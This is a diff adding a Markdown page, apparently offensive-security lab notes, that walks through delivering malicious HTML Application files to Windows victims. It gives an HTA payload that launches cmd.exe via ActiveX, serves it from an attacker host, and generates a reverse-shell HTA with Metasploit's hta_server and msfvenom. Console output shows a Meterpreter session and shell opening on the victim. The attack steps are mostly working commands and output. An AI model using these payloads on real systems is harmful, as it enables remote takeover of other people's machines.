@@ -1,0 +1,87 @@
+---
+title: HTA
+description:  An HTML Application (HTA) is a Microsoft Windows program that combines HTML, Dynamic HTML, and scripting languages supported by Internet Explorer, such as VBScript or JScript, to create a desktop application-like interface
+---
+
+## HTML Application
+
+The LOLBINS tool `mshta` is used to execute HTA files. It can be executed by itself or automatically from Internet Explorer. 
+
+
+In the following example, we will use an ActiveXObject in our payload as proof of concept to execute cmd.exe. 
+
+Consider the following HTML code.
+
+```html
+<html>
+<body>
+	<script>
+		let c ='cmd.exe';
+		new ActiveXObject('WScript.Shell').Run(c);
+	</script>
+</body>
+</html>
+```
+
+Then serve the payload.hta from a web server, this could be done from the attacking machine as follows,
+```bash
+user@machine$ python3 -m http.server 8090 
+Serving HTTP on 0.0.0.0 port 8090 (http://0.0.0.0:8090/)
+```
+On the victim machine, visit the malicious link  http://ATTACKER_IP.37:8090/payload.hta
+
+## Malicious HTA
+
+Another way to generate and serve malicious HTA files using the Metasploit framework.
+
+```bash
+msf6 > use exploit/windows/misc/hta_server 
+msf6 exploit(windows/misc/hta_server) > set LHOST 10.8.232.37 
+LHOST => 10.8.232.37 
+msf6 exploit(windows/misc/hta_server) > set LPORT 443 
+LPORT => 443 
+msf6 exploit(windows/misc/hta_server) > set SRVHOST 10.8.232.37 
+SRVHOST => 10.8.232.37 
+msf6 exploit(windows/misc/hta_server) > set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp 
+msf6 exploit(windows/misc/hta_server) > exploit 
+[*] Exploit running as background job 0. 
+[*] Exploit completed, but no session was created. msf6 exploit(windows/misc/hta_server) > 
+[*] Started reverse TCP handler on 10.8.232.37:443 
+[*] Using URL: http://10.8.232.37:8080/TkWV9zkd.hta 
+[*] Server started.
+
+```
+We can create a reverse shell payload as follows,
+```bash
+user@machine$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.232.37 LPORT=443-f hta-psh -o malicious.hta
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of hta-psh file: 7692 bytes
+Saved as: malicious.hta
+```
+
+On the victim machine, once we visit the malicious HTA file that was provided as a URL by Metasploit, we should receive a reverse connection.
+```bash
+user@machine$[*]10.10.201.254    hta_server - Delivering Payload
+[*] Sending stage (175174 bytes) to 10.10.201.254
+[*] Meterpreter session 1 opened (10.8.232.37:443 -> 10.10.201.254:61629) at 2021-11-16 06:15:46 -0600
+msf6 exploit(windows/misc/hta_server) > sessions -i 1
+[*] Starting interaction with 1...
+meterpreter > sysinfo
+Computer        : DESKTOP-1AU6NT4
+OS              : Windows 10 (10.0 Build 14393).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 3
+Meterpreter     : x86/windows
+meterpreter > shell
+Process 4124 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+C:\app>
+```
